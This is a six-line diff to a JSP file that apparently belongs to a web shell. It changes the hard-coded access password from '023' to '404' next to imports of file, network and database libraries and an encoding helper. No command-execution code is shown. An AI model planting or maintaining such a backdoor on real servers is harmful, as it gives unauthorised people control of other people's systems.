@@ -1,6 +1,6 @@
 <%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
 <%!
-	String Pwd = "023";
+	String Pwd = "404";
 
 	String EC(String s, String c) throws Exception {
 		return s;
